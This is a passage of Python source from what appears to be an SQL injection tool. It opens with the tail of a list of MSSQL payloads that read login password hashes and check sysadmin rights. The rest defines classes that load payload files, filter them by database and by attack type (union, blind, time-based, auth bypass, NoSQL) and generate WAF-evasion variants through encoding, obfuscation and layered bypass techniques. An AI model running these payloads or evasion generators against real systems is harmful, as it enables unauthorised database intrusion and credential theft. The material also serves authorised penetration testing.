                "SELECT * FROM fn_my_permissions('Sales.vIndividualCustomer', 'OBJECT') ORDER BY subentity_name, permission_name; ",
                "SELECT is_srvrolemember('sysadmin');",
                "SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins ",
                "SELECT name, password_hash FROM master.sys.sql_logins",
                "SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins",



            ]
        }
    
    def get_all_payloads(self, category=None):
        """Get all payloads or specific category"""
        if category:
            return self.payloads.get(category, {})
        return self.payloads
    
    def get_flattened_payloads(self):
        """Get all payloads as a flat list"""
        flattened = []
        for category, payloads in self.payloads.items():
            if isinstance(payloads, dict):
                for subcategory, subpayloads in payloads.items():
                    flattened.extend(subpayloads)
            else:
                flattened.extend(payloads)
        return flattened



class PayloadLoadError(Exception):
    """Raised when a payload file cannot be loaded."""
    pass


class AdvancedDetectionPayloads:
    def __init__(self, payloads_directory="payloads", logger=None):
        self.payloads_directory = Path(payloads_directory)
        self.payloads = {}
        self.categories = {}
        self.logger = logger or logging.getLogger(__name__)
        self._load_payloads()

    def _normalize_category(self, path: Path) -> str:
        if path == self.payloads_directory:
            return "generic"
        relative = path.relative_to(self.payloads_directory)
        return "_".join(relative.parts).lower()

    def _normalize_key(self, filename: str) -> str:
        return Path(filename).stem.replace(" ", "_").lower()

    def _load_payloads(self):
        if not self.payloads_directory.exists():
            self.logger.warning(f"Payload directory not found: {self.payloads_directory}")
            return

        total_files = 0
        total_payloads = 0

        for file_path in self.payloads_directory.rglob("*.txt"):
            category = self._normalize_category(file_path.parent)
            file_key = self._normalize_key(file_path.name)
            key = f"{category}_{file_key}"

            try:
                with file_path.open("r", encoding="utf-8", errors="ignore") as f:
                    payloads = [
                        line.strip()
                        for line in f
                        if line.strip() and not line.startswith("#")
                    ]

                self.payloads[key] = payloads

                if category not in self.categories:
                    self.categories[category] = []
                self.categories[category].append(key)

                total_files += 1
                total_payloads += len(payloads)

            except Exception as e:
                self.logger.error(f"Error loading file {file_path}: {e}")
                raise PayloadLoadError(f"Failed to load: {file_path}") from e

        self.logger.info(f"Payload loading complete: {total_files} files, {total_payloads} payloads")


    def get_payloads_by_category(self, category_pattern):
        patterns = [p.strip().lower() for p in category_pattern.split(",")]
        return {
            key: payloads
            for key, payloads in self.payloads.items()
            if any(p in key.lower() for p in patterns)
        }

    def get_payloads_by_database(self, db_type):
        db_type = db_type.lower()
        return {
            key: payloads
            for key, payloads in self.payloads.items()
            if db_type in key.lower()
        }

    def get_payloads_by_attack_type(self, attack_type):
        attack_type = attack_type.lower()

        attack_keywords = {
            "union": ["union", "select"],
            "blind": ["blind"],
            "error": ["error"],
            "time": ["time"],
            "auth": ["auth", "bypass"],
            "nosql": ["nosql", "no-sql"],
            "generic": ["generic"],
            "xor": ["xor"],
        }

        if attack_type not in attack_keywords:
            return {}

        keywords = attack_keywords[attack_type]
        return {
            key: payloads
            for key, payloads in self.payloads.items()
            if any(k in key.lower() for k in keywords)
        }

    def get_all_categories(self):
        return list(self.categories.keys())

    def get_category_stats(self):
        return {
            cat: {
                "files": len(keys),
                "payloads": sum(len(self.payloads[k]) for k in keys),
            }
            for cat, keys in self.categories.items()
        }

    def get_all_payloads(self):
        return self.payloads



class EnhancedPayloadGenerator:
    def __init__(self, use_bypass=False, payloads_directory="payloads", smart_learning=False):
        self.basic_payloads = BasicDetectionPayloads()
        self.advanced_payloads = AdvancedDetectionPayloads(payloads_directory)
        self.bypass_engine = AdvancedWAFBypass() if use_bypass else None
        self.smart_bypass = SmartWAFBypass() if smart_learning else None
        
        # All bypass techniques available
        self.bypass_techniques = [
            'case_manipulation',
            'whitespace_obfuscation', 
            'encoding_techniques',
            'comment_obfuscation',
            'string_concatenation',
            'keyword_splitting',
            'null_bytes_injection',
            'unicode_obfuscation',
            'multiple_encoding',
            'sql_char_function',
            'hex_encoding',
            'comment_advanced_techniques',
            'parameter_pollution',
            'protocol_level_bypass',
            'template_injection',
            'chunked_encoding_bypass'
        ]
    
    def generate_basic_payloads(self, categories=None):
        """Generate basic detection payloads"""
        if categories:
            if isinstance(categories, str):
                categories = [categories]
            return {cat: self.basic_payloads.get_all_payloads(cat) for cat in categories}
        return self.basic_payloads.get_all_payloads()
    
    def generate_advanced_payloads(self, categories=None, db_type=None, attack_type=None):
        """Generate advanced detection payloads with multiple filtering options"""
        if categories:
            return self.advanced_payloads.get_payloads_by_category(categories)
        elif db_type:
            return self.advanced_payloads.get_payloads_by_database(db_type)
        elif attack_type:
            return self.advanced_payloads.get_payloads_by_attack_type(attack_type)
        else:
            return self.advanced_payloads.get_all_payloads()
    
    def generate_bypass_payloads(self, original_payloads, bypass_methods=None, max_variations=10):
        """Generate WAF bypass variants of payloads using ALL bypass techniques"""
        if not self.bypass_engine:
            return original_payloads
        
        # Use all techniques if none specified
        if bypass_methods is None:
            bypass_methods = self.bypass_techniques
        
        bypassed_payloads = []
        
        print(f"🛡️ Applying {len(bypass_methods)} bypass techniques...")
        
        for payload in original_payloads:
            try:
                # Apply individual bypass techniques
                for method in bypass_methods:
                    if hasattr(self.bypass_engine, method):
                        technique_func = getattr(self.bypass_engine, method)
                        variations = technique_func(payload)
                        bypassed_payloads.extend(variations[:2])  # Limit variations per technique
                
                # Apply combined bypass techniques
                combined_variations = self.bypass_engine.apply_all_bypasses(payload, max_variations=max_variations)
                bypassed_payloads.extend(combined_variations)
                
            except Exception as e:
                print(f"⚠️ Bypass error for payload '{payload}': {e}")
                continue
        
        # Remove duplicates and return
        return list(set(bypassed_payloads))
    
    def generate_smart_bypass_payloads(self, original_payloads, learning_data=None):
        """Generate intelligent bypass payloads using machine learning"""
        if not self.smart_bypass or not self.bypass_engine:
            return original_payloads
        
        # Apply learning from previous attempts
        if learning_data:
            for payload, response_code, response_body in learning_data:
                self.smart_bypass.analyze_response(payload, response_code, response_body)
        
        smart_payloads = []
        for payload in original_payloads:
            optimized = self.smart_bypass.get_optimized_bypass(payload, self.bypass_engine)
            smart_payloads.extend(optimized)
        
        return list(set(smart_payloads))
    
    def generate_technique_specific_bypass(self, payloads, technique_name, max_variations=5):
        """Generate bypass payloads using specific techniques only"""
        if not self.bypass_engine:
            return payloads
        
        technique_payloads = []
        for payload in payloads:
            if hasattr(self.bypass_engine, technique_name):
                technique_func = getattr(self.bypass_engine, technique_name)
                variations = technique_func(payload)
                technique_payloads.extend(variations[:max_variations])
        
        return list(set(technique_payloads))
    
    def generate_comprehensive_payloads(self, include_basic=True, include_advanced=True, 
                                      include_bypass=False, bypass_methods=None,
                                      use_smart_bypass=False, learning_data=None,
                                      categories=None, db_type=None, 
                                      attack_type=None, max_payloads=None,
                                      bypass_variations=5):
        """Generate comprehensive payload list with enhanced bypass integration"""
        all_payloads = []
        
        # Generate base payloads
        if include_basic:
            if categories:
                basic_data = self.generate_basic_payloads(categories)
            else:
                basic_data = self.generate_basic_payloads()
            
            # Flatten basic payloads
            for category, payloads in basic_data.items():
                if isinstance(payloads, dict):
                    for sub_payloads in payloads.values():
                        all_payloads.extend(sub_payloads)
                else:
                    all_payloads.extend(payloads)
        
        if include_advanced:
            advanced_data = self.generate_advanced_payloads(
                categories=categories, 
                db_type=db_type, 
                attack_type=attack_type
            )
            for payloads in advanced_data.values():
                all_payloads.extend(payloads)
        
        # Remove duplicates
        all_payloads = list(set(all_payloads))
        
        # Apply bypass techniques
        if include_bypass:
            if use_smart_bypass and self.smart_bypass:
                print("🧠 Using smart bypass with learning...")
                all_payloads = self.generate_smart_bypass_payloads(all_payloads, learning_data)
            else:
                print("🛡️ Applying comprehensive bypass techniques...")
                all_payloads = self.generate_bypass_payloads(
                    all_payloads, 
                    bypass_methods, 
                    max_variations=bypass_variations
                )
        
        # Limit payloads if requested
        if max_payloads and len(all_payloads) > max_payloads:
            all_payloads = random.sample(all_payloads, max_payloads)
        
        print(f"🎯 Generated {len(all_payloads)} total payloads")
        return all_payloads
    
    def generate_targeted_bypass_attack(self, attack_type, bypass_techniques=None, max_payloads=30):
        """Generate targeted bypass attacks for specific scenarios"""
        base_payloads = self._get_targeted_base_payloads(attack_type, max_payloads//2)
        
        if not bypass_techniques:
            bypass_techniques = self.bypass_techniques
        
        bypassed_payloads = self.generate_bypass_payloads(
            base_payloads, 
            bypass_techniques, 
            max_variations=3
        )
        
        return bypassed_payloads[:max_payloads]
    
    def _get_targeted_base_payloads(self, attack_type, max_payloads):
        """Get base payloads for specific attack types"""
        targeted_sets = {
            'quick_scan': self.basic_payloads.get_flattened_payloads()[:10],
            'mysql_test': self._extract_payloads_for_db('mysql', max_payloads),
            'union_attack': self._extract_payloads_for_attack('union', max_payloads),
            'blind_attack': self._extract_payloads_for_attack('blind', max_payloads),
            'time_based': self._extract_payloads_for_attack('time', max_payloads),
            'error_based': self._extract_payloads_for_attack('error', max_payloads),
            'auth_bypass': self._extract_payloads_for_attack('auth', max_payloads),
            'nosql_test': self._extract_payloads_for_attack('nosql', max_payloads)
        }
        
        return targeted_sets.get(attack_type, [])
    
    def _extract_payloads_for_db(self, db_type, max_payloads):
        """Extract payloads for specific database"""
        payloads = []
        db_payloads = self.advanced_payloads.get_payloads_by_database(db_type)
        
        for p_list in db_payloads.values():
            payloads.extend(p_list)
        
        return payloads[:max_payloads]
    
    def _extract_payloads_for_attack(self, attack_type, max_payloads):
        """Extract payloads for specific attack type"""
        payloads = []
        attack_payloads = self.advanced_payloads.get_payloads_by_attack_type(attack_type)
        
        for p_list in attack_payloads.values():
            payloads.extend(p_list)
        
        return payloads[:max_payloads]
    
    def get_bypass_technique_stats(self):
        """Get statistics about available bypass techniques"""
        return {
            'total_techniques': len(self.bypass_techniques),
            'techniques': self.bypass_techniques,
            'smart_learning': self.smart_bypass is not None,
            'bypass_engine': self.bypass_engine is not None
        }
    
    def generate_layered_bypass_attack(self, base_payload, layers=3):
        """Apply multiple layers of bypass techniques"""
        if not self.bypass_engine:
            return [base_payload]
        
        current_payloads = [base_payload]
        
        for layer in range(layers):
            print(f"🔰 Applying bypass layer {layer + 1}...")
            new_payloads = []
            
            for payload in current_payloads:
                # Use different techniques for each layer
                if layer == 0:
                    techniques = ['case_manipulation', 'whitespace_obfuscation']
                elif layer == 1:
                    techniques = ['encoding_techniques', 'comment_obfuscation']
                else:
                    techniques = ['string_concatenation', 'hex_encoding', 'unicode_obfuscation']
                
                bypassed = self.generate_technique_specific_bypass([payload], techniques[0], 2)
                new_payloads.extend(bypassed)
            
            current_payloads = list(set(new_payloads))
        
        return current_payloads